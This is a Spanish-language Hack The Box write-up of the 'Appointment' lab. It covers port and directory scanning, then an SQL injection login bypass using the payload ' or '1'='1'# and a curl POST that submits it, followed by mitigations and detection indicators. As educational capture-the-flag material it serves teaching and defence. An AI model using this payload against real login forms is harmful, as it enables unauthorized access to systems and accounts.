---
machine: Appointment
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, sqli, linux, tier1]
---

# Appointment — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

Un Apache con un formulario de login en **80/tcp** concatena la entrada del usuario en la consulta SQL. El payload `admin' or '1'='1'#` convierte la condición en siempre verdadera, la sesión se abre como administrador y la flag aparece en el panel.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

- Un único puerto: **80/tcp**.
- Sin SSH ni base de datos expuesta: toda la superficie es la aplicación web.
- `whatweb` no revela CMS; es una app PHP propia con login.

## Enumeración

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

Rutas relevantes:

```text
/index.php   (200)
/info.php    (200)
/css, /js, /fonts, /images
```

- `/index.php` muestra el formulario de acceso.
- `/info.php` expone la versión de PHP y confirma el stack (LAMP).
- No hay registro ni recuperación de contraseña: el único punto de entrada es el login.

## Foothold

Se prueba primero la hipótesis barata: credenciales por defecto (`admin:admin`) → falla. Después se comprueba si el campo es inyectable.

Usuario: `admin`
Contraseña: `' or '1'='1'#`

La consulta que construye el backend queda así:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' or '1'='1'#'';
```

- `' or '1'='1` cierra la cadena y añade una condición siempre verdadera.
- `#` comenta el resto de la consulta, incluida la comprobación de contraseña.
- El `SELECT` devuelve la primera fila (el administrador) y la aplicación crea la sesión.

```bash
curl -s -X POST http://<TARGET_IP>/index.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' or '1'='1'#" | grep -i flag
```

Al autenticarse, el panel muestra la flag.

## Movimiento lateral

- No aplica: un solo host y un solo servicio.
- Las credenciales obtenidas no dan acceso a otros sistemas.

## Escalada de privilegios

- No aplica: la flag está en la propia aplicación, no hay shell de sistema.
- Lección: en Tier 1 el objetivo es entender el fallo, no encadenar una escalada.

## Evidencia

- Petición POST con el payload y respuesta con la flag redactada.
- Sin credenciales reales ni flags en el repositorio: viven en `private/`.

## Lecciones aprendidas

- Un formulario de login es un punto de inyección SQL antes que un punto de fuerza bruta.
- El comentario `#` (MySQL/MariaDB) es lo que permite anular el chequeo de contraseña; en otros motores sería `--` o `/* */`.
- Probar `admin' or '1'='1'#` cuesta diez segundos y evita un ataque de diccionario inútil.
- Las respuestas de error deben revisarse: revelan si el input llega crudo al motor.

## Mitigaciones y detección

**Cómo se corrige:**

- Consultas preparadas con parámetros vinculados (`PDO`/`mysqli`) en lugar de concatenación.
- Validación y longitud máxima de los campos en servidor.
- Usuario de base de datos con permisos mínimos (solo `SELECT` sobre las columnas necesarias).
- WAF como defensa en profundidad, nunca como única medida.

**Cómo se detectaría:**

- Peticiones con comillas, `OR 1=1` o `#` en campos de login (logs del WAF y de Apache).
- Errores SQL devueltos al cliente o picos de latencia en la base.
- Autenticaciones correctas con contraseña vacía o usuario inexistente.

- CWE-89: SQL Injection
- OWASP Top 10 2021: A03 Injection
- MITRE ATT&CK: [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

## Referencias

- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection)
